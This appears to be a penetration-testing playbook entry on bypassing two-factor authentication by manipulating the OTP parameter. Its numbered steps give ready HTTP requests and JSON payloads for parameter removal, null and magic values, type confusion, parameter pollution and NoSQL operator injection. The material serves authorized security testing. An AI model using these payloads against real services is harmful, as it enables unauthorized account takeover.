# 2FA — OTP Parameter Manipulation

## When this applies

- The verification endpoint is reachable but the OTP parameter validation is weak (accepts empty, null, missing, or specific magic values).

## Technique

Send the verification request with the OTP parameter modified — removed, set to empty string, set to null, or set to a known-bypass value (`0000`, `000000`, `*`). Some implementations short-circuit when the parameter is "not present" but actually treat empty/null as a successful match.

## Steps

### 1. Capture normal verification request

```http
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"username":"test","otp":"123456"}
```

### 2. Test parameter removal

```http
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"username":"test"}
```

### 3. Test empty / null / array

```json
{"username":"test","otp":""}
{"username":"test","otp":null}
{"username":"test","otp":[]}
{"username":"test","otp":{}}
{"username":"test","otp":0}
{"username":"test","otp":false}
```

### 4. Test magic values

```json
{"username":"test","otp":"0000"}
{"username":"test","otp":"000000"}
{"username":"test","otp":"123456"}    # most common test code
{"username":"test","otp":"111111"}
{"username":"test","otp":"*"}
{"username":"test","otp":"any"}
```

### 5. Test type confusion

```json
{"username":"test","otp":true}
{"username":"test","otp":1}
{"username":"test","otp":-1}
```

When the verifier compares strict-equal vs loose, type confusion can flip results.

### 6. Test parameter pollution

```http
POST /verify-2fa
Content-Type: application/x-www-form-urlencoded

username=test&otp=&otp=valid_otp
```

Some parsers use the FIRST `otp`, others the LAST.

### 7. Test extra characters (length tolerance)

```json
{"username":"test","otp":"1234567890"}    # too long
{"username":"test","otp":"123"}            # too short
```

Sometimes too-long codes pass length-only validation while bypassing the time-based check.

### 8. Test JSON injection in OTP value

When OTP is verified by parsing, malformed input may bypass:
```json
{"username":"test","otp":"123456\""}
{"username":"test","otp":{"$ne":""}}     # if NoSQL backend
```

Combine with `injection/scenarios/nosql/mongo-operator-injection.md`.

## Verifying success

- Server accepts the modified payload and returns a session/auth token.
- Subsequent requests to protected endpoints succeed.

## Common pitfalls

- Server-side schema validation usually blocks empty/null OTP — modern apps return 400 immediately.
- Some endpoints have separate "request OTP" and "verify OTP" steps; missing parameter on verify just returns "request OTP first".
- Logging may flag the unusual request as anomalous.

## Tools

- Burp Suite Repeater.
- Custom curl / Python with body modification.
- Burp Intruder for bulk testing variations.
